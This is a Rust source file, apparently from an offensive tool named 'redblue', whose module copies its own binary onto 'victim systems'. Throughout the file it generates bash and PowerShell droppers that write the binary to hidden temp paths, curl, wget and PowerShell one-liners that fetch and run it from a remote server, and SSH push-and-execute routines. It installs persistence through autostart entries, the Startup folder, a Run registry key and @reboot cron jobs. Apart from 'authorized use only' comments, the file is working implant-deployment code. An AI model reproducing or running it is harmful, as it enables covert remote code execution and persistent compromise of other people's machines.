/// Self-replication module for deploying redblue binary to victim systems
///
/// This module extracts the current rb binary, encodes it, and generates
/// deployment scripts for Linux, Windows, and MacOS targets.
///
/// ⚠️ AUTHORIZED USE ONLY - For pentesting, CTFs, and authorized security research
use std::env;
use std::fs;
use std::io::{Read, Write};
use std::net::TcpStream;
use std::path::PathBuf;
use std::sync::OnceLock;

/// Cached self-binary for repeated access without re-reading from disk
static SELF_BINARY_CACHE: OnceLock<Vec<u8>> = OnceLock::new();

/// Get the current binary as bytes (cached)
pub fn self_binary() -> Result<&'static Vec<u8>, String> {
    SELF_BINARY_CACHE.get_or_try_init(|| {
        let path = env::current_exe()
            .map_err(|e| format!("Failed to get current binary path: {}", e))?;
        fs::read(&path)
            .map_err(|e| format!("Failed to read binary: {}", e))
    })
}

/// Get the path to the current binary
pub fn self_binary_path() -> Result<PathBuf, String> {
    env::current_exe()
        .map_err(|e| format!("Failed to get current binary path: {}", e))
}

/// Get the size of the current binary in bytes
pub fn self_binary_size() -> Result<u64, String> {
    let path = self_binary_path()?;
    let metadata = fs::metadata(&path)
        .map_err(|e| format!("Failed to get binary metadata: {}", e))?;
    Ok(metadata.len())
}

/// Self-replicator to deploy rb binary to victims
pub struct SelfReplicator {
    /// Path to current binary (auto-detected)
    binary_path: PathBuf,
    /// Base64-encoded binary payload
    encoded_payload: Option<String>,
    /// Target OS (linux, windows, macos)
    target_os: String,
    /// Enable persistence mechanisms
    persistence: bool,
}

impl SelfReplicator {
    /// Create new self-replicator (auto-detects current binary)
    pub fn new() -> Result<Self, String> {
        let binary_path =
            env::current_exe().map_err(|e| format!("Failed to get current binary path: {}", e))?;

        Ok(Self {
            binary_path,
            encoded_payload: None,
            target_os: "linux".to_string(),
            persistence: false,
        })
    }

    /// Set target OS (linux, windows, macos)
    pub fn with_os(mut self, os: &str) -> Self {
        self.target_os = os.to_lowercase();
        self
    }

    /// Enable persistence mechanisms
    pub fn with_persistence(mut self, enable: bool) -> Self {
        self.persistence = enable;
        self
    }

    /// Extract and encode the current binary as base64
    pub fn extract_binary(&mut self) -> Result<(), String> {
        // Read binary file
        let mut file = fs::File::open(&self.binary_path)
            .map_err(|e| format!("Failed to open binary: {}", e))?;

        let mut buffer = Vec::new();
        file.read_to_end(&mut buffer)
            .map_err(|e| format!("Failed to read binary: {}", e))?;

        // Base64 encode (using our crypto module)
        use crate::crypto::encode_base64;
        self.encoded_payload = Some(encode_base64(&buffer));

        Ok(())
    }

    /// Generate deployment script for target OS
    pub fn generate_script(&self) -> Result<String, String> {
        let payload = self
            .encoded_payload
            .as_ref()
            .ok_or("Binary not extracted. Call extract_binary() first")?;

        match self.target_os.as_str() {
            "linux" | "macos" => self.generate_bash_script(payload),
            "windows" => self.generate_powershell_script(payload),
            _ => Err(format!("Unsupported OS: {}", self.target_os)),
        }
    }

    /// Generate bash deployment script (Linux/MacOS)
    fn generate_bash_script(&self, payload: &str) -> Result<String, String> {
        let mut script = String::new();

        script.push_str("#!/bin/bash\n");
        script.push_str("# redblue self-replication deployment script\n");
        script.push_str("# ⚠️ AUTHORIZED USE ONLY\n\n");

        script.push_str("set -e\n\n");

        // Base64 payload (chunked for readability)
        script.push_str("# Base64-encoded redblue binary\n");
        script.push_str("PAYLOAD=\"");
        script.push_str(payload);
        script.push_str("\"\n\n");

        // Decode and deploy
        script.push_str("# Deploy binary\n");
        script.push_str("echo \"[+] Deploying redblue binary...\"\n");
        script.push_str("echo \"$PAYLOAD\" | base64 -d > /tmp/.rb\n");
        script.push_str("chmod +x /tmp/.rb\n");
        script.push_str("echo \"[+] Binary deployed to /tmp/.rb\"\n\n");

        // Persistence (optional)
        if self.persistence {
            script.push_str("# Enable persistence\n");
            script.push_str("echo \"[+] Installing persistence...\"\n");
            script.push_str("cp /tmp/.rb ~/.local/bin/rb 2>/dev/null || true\n");
            script.push_str("mkdir -p ~/.config/autostart 2>/dev/null || true\n");
            script.push_str("cat > ~/.config/autostart/rb.desktop <<'EOF'\n");
            script.push_str("[Desktop Entry]\n");
            script.push_str("Type=Application\n");
            script.push_str("Name=redblue\n");
            script.push_str("Exec=$HOME/.local/bin/rb shell\n");
            script.push_str("Hidden=true\n");
            script.push_str("EOF\n");
            script.push_str("echo \"[+] Persistence installed\"\n\n");
        }

        // Execute
        script.push_str("# Execute redblue\n");
        script.push_str("echo \"[+] Launching redblue...\"\n");
        script.push_str("/tmp/.rb --version\n");
        script.push_str("echo \"[+] Deployment complete!\"\n");

        Ok(script)
    }

    /// Generate PowerShell deployment script (Windows)
    fn generate_powershell_script(&self, payload: &str) -> Result<String, String> {
        let mut script = String::new();

        script.push_str("# redblue self-replication deployment script (PowerShell)\n");
        script.push_str("# ⚠️ AUTHORIZED USE ONLY\n\n");

        script.push_str("$ErrorActionPreference = \"Stop\"\n\n");

        // Base64 payload
        script.push_str("# Base64-encoded redblue binary\n");
        script.push_str("$payload = @\"\n");
        script.push_str(payload);
        script.push_str("\n\"@\n\n");

        // Decode and deploy
        script.push_str("# Deploy binary\n");
        script.push_str("Write-Host \"[+] Deploying redblue binary...\"\n");
        script.push_str("$bytes = [System.Convert]::FromBase64String($payload)\n");
        script.push_str("$targetPath = \"$env:TEMP\\rb.exe\"\n");
        script.push_str("[System.IO.File]::WriteAllBytes($targetPath, $bytes)\n");
        script.push_str("Write-Host \"[+] Binary deployed to $targetPath\"\n\n");

        // Persistence (optional)
        if self.persistence {
            script.push_str("# Enable persistence\n");
            script.push_str("Write-Host \"[+] Installing persistence...\"\n");
            script.push_str("$startupPath = \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\rb.bat\"\n");
            script.push_str(
                "Set-Content -Path $startupPath -Value \"@echo off`nstart /b $targetPath shell\"\n",
            );
            script.push_str("Write-Host \"[+] Persistence installed\"\n\n");
        }

        // Execute
        script.push_str("# Execute redblue\n");
        script.push_str("Write-Host \"[+] Launching redblue...\"\n");
        script.push_str("& $targetPath --version\n");
        script.push_str("Write-Host \"[+] Deployment complete!\"\n");

        Ok(script)
    }

    /// Get binary size in bytes
    pub fn binary_size(&self) -> Result<u64, String> {
        let metadata = fs::metadata(&self.binary_path)
            .map_err(|e| format!("Failed to get binary metadata: {}", e))?;
        Ok(metadata.len())
    }

    /// Get binary path
    pub fn binary_path(&self) -> &PathBuf {
        &self.binary_path
    }

    /// Save deployment script to file
    pub fn save_script(&self, output_path: &str) -> Result<(), String> {
        let script = self.generate_script()?;

        fs::write(output_path, script).map_err(|e| format!("Failed to write script: {}", e))?;

        // Make executable on Unix
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let mut perms = fs::metadata(output_path)
                .map_err(|e| format!("Failed to get file metadata: {}", e))?
                .permissions();
            perms.set_mode(0o755);
            fs::set_permissions(output_path, perms)
                .map_err(|e| format!("Failed to set permissions: {}", e))?;
        }

        Ok(())
    }

    /// Generate curl one-liner for HTTP-based deployment
    ///
    /// Assumes redblue HTTP server is running with `--serve-self` flag
    pub fn curl_oneliner(&self, server_addr: &str) -> String {
        match self.target_os.as_str() {
            "linux" | "macos" => {
                if self.persistence {
                    format!(
                        "curl -s http://{}/rb -o /tmp/.rb && chmod +x /tmp/.rb && \
                         mkdir -p ~/.local/bin && cp /tmp/.rb ~/.local/bin/rb && \
                         (crontab -l 2>/dev/null; echo '@reboot ~/.local/bin/rb shell') | crontab - && \
                         /tmp/.rb --version",
                        server_addr
                    )
                } else {
                    format!(
                        "curl -s http://{}/rb -o /tmp/.rb && chmod +x /tmp/.rb && /tmp/.rb --version",
                        server_addr
                    )
                }
            }
            "windows" => {
                if self.persistence {
                    format!(
                        "powershell -c \"Invoke-WebRequest -Uri 'http://{}/rb' -OutFile $env:TEMP\\rb.exe; \
                         Copy-Item $env:TEMP\\rb.exe $env:APPDATA\\rb.exe; \
                         New-ItemProperty -Path 'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'rb' -Value $env:APPDATA\\rb.exe -Force; \
                         & $env:TEMP\\rb.exe --version\"",
                        server_addr
                    )
                } else {
                    format!(
                        "powershell -c \"Invoke-WebRequest -Uri 'http://{}/rb' -OutFile $env:TEMP\\rb.exe; & $env:TEMP\\rb.exe --version\"",
                        server_addr
                    )
                }
            }
            _ => format!("curl -s http://{}/rb -o /tmp/rb && chmod +x /tmp/rb && /tmp/rb --version", server_addr),
        }
    }

    /// Generate wget one-liner as fallback
    pub fn wget_oneliner(&self, server_addr: &str) -> String {
        match self.target_os.as_str() {
            "linux" | "macos" => {
                format!(
                    "wget -qO /tmp/.rb http://{}/rb && chmod +x /tmp/.rb && /tmp/.rb --version",
                    server_addr
                )
            }
            _ => format!(
                "wget -qO /tmp/rb http://{}/rb && chmod +x /tmp/rb && /tmp/rb --version",
                server_addr
            ),
        }
    }
}

/// SSH-based deployment for remote hosts
pub struct SshDeployer {
    /// Target host
    host: String,
    /// SSH port
    port: u16,
    /// Username
    username: String,
    /// Optional password (prefer key auth)
    password: Option<String>,
    /// Target path on remote system
    remote_path: String,
    /// Enable persistence
    persistence: bool,
}

impl SshDeployer {
    /// Create new SSH deployer
    pub fn new(host: &str, username: &str) -> Self {
        Self {
            host: host.to_string(),
            port: 22,
            username: username.to_string(),
            password: None,
            remote_path: "/tmp/.rb".to_string(),
            persistence: false,
        }
    }

    /// Set SSH port
    pub fn port(mut self, port: u16) -> Self {
        self.port = port;
        self
    }

    /// Set password (prefer SSH keys over passwords)
    pub fn password(mut self, password: &str) -> Self {
        self.password = Some(password.to_string());
        self
    }

    /// Set remote deployment path
    pub fn remote_path(mut self, path: &str) -> Self {
        self.remote_path = path.to_string();
        self
    }

    /// Enable persistence
    pub fn with_persistence(mut self, enable: bool) -> Self {
        self.persistence = enable;
        self
    }

    /// Generate scp command to transfer binary
    pub fn scp_command(&self) -> Result<String, String> {
        let binary_path = self_binary_path()?;
        Ok(format!(
            "scp -P {} {} {}@{}:{}",
            self.port,
            binary_path.display(),
            self.username,
            self.host,
            self.remote_path
        ))
    }

    /// Generate ssh command to execute binary on remote
    pub fn ssh_exec_command(&self) -> String {
        if self.persistence {
            format!(
                "ssh -p {} {}@{} 'chmod +x {} && {} --version && \
                 mkdir -p ~/.local/bin && cp {} ~/.local/bin/rb && \
                 (crontab -l 2>/dev/null; echo \"@reboot ~/.local/bin/rb shell\") | crontab -'",
                self.port, self.username, self.host, self.remote_path, self.remote_path, self.remote_path
            )
        } else {
            format!(
                "ssh -p {} {}@{} 'chmod +x {} && {} --version'",
                self.port, self.username, self.host, self.remote_path, self.remote_path
            )
        }
    }

    /// Generate combined deploy + execute script
    pub fn deploy_script(&self) -> Result<String, String> {
        let mut script = String::new();

        script.push_str("#!/bin/bash\n");
        script.push_str("# redblue SSH deployment script\n");
        script.push_str("# ⚠️ AUTHORIZED USE ONLY\n\n");
        script.push_str("set -e\n\n");

        script.push_str(&format!("echo '[+] Deploying to {}@{}...'\n", self.username, self.host));
        script.push_str(&format!("{}\n", self.scp_command()?));
        script.push_str(&format!("{}\n", self.ssh_exec_command()));
        script.push_str("echo '[+] Deployment complete!'\n");

        Ok(script)
    }

    /// Execute deployment (requires ssh/scp available)
    pub fn deploy(&self) -> Result<String, String> {
        use std::process::Command;

        // First, copy the binary
        let binary_path = self_binary_path()?;
        let scp_output = Command::new("scp")
            .args([
                "-P", &self.port.to_string(),
                &binary_path.to_string_lossy(),
                &format!("{}@{}:{}", self.username, self.host, self.remote_path),
            ])
            .output()
            .map_err(|e| format!("Failed to execute scp: {}", e))?;

        if !scp_output.status.success() {
            return Err(format!(
                "scp failed: {}",
                String::from_utf8_lossy(&scp_output.stderr)
            ));
        }

        // Then, execute on remote
        let mut ssh_args = vec![
            "-p".to_string(),
            self.port.to_string(),
            format!("{}@{}", self.username, self.host),
            format!("chmod +x {} && {} --version", self.remote_path, self.remote_path),
        ];

        if self.persistence {
            ssh_args[3] = format!(
                "chmod +x {} && {} --version && \
                 mkdir -p ~/.local/bin && cp {} ~/.local/bin/rb && \
                 (crontab -l 2>/dev/null; echo '@reboot ~/.local/bin/rb shell') | crontab -",
                self.remote_path, self.remote_path, self.remote_path
            );
        }

        let ssh_output = Command::new("ssh")
            .args(&ssh_args)
            .output()
            .map_err(|e| format!("Failed to execute ssh: {}", e))?;

        if ssh_output.status.success() {
            Ok(String::from_utf8_lossy(&ssh_output.stdout).to_string())
        } else {
            Err(format!(
                "ssh failed: {}",
                String::from_utf8_lossy(&ssh_output.stderr)
            ))
        }
    }
}

/// Transfer strategy detection
#[derive(Debug, Clone, PartialEq)]
pub enum TransferStrategy {
    /// SSH-based transfer (scp + ssh exec)
    Ssh,
    /// HTTP download from redblue server
    Http,
    /// Base64-encoded payload in script
    Script,
}

impl TransferStrategy {
    /// Detect best transfer strategy for target
    pub fn detect(target: &str) -> Self {
        // Simple heuristic: if SSH port is open, prefer SSH
        // Otherwise, check for HTTP connectivity
        if let Ok(stream) = TcpStream::connect_timeout(
            &format!("{}:22", target).parse().unwrap_or_else(|_| "127.0.0.1:22".parse().unwrap()),
            std::time::Duration::from_secs(2),
        ) {
            drop(stream);
            return TransferStrategy::Ssh;
        }

        // Fallback to HTTP or Script
        TransferStrategy::Script
    }

    /// Get strategy name
    pub fn name(&self) -> &'static str {
        match self {
            TransferStrategy::Ssh => "SSH (scp + ssh)",
            TransferStrategy::Http => "HTTP (curl/wget)",
            TransferStrategy::Script => "Base64 Script",
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_replicator_creation() {
        let replicator = SelfReplicator::new();
        assert!(replicator.is_ok());
    }

    #[test]
    fn test_os_targeting() {
        let replicator = SelfReplicator::new()
            .unwrap()
            .with_os("windows")
            .with_persistence(true);

        assert_eq!(replicator.target_os, "windows");
        assert!(replicator.persistence);
    }

    #[test]
    fn test_binary_size() {
        let replicator = SelfReplicator::new().unwrap();
        let size = replicator.binary_size();
        assert!(size.is_ok());
        assert!(size.unwrap() > 0);
    }
}
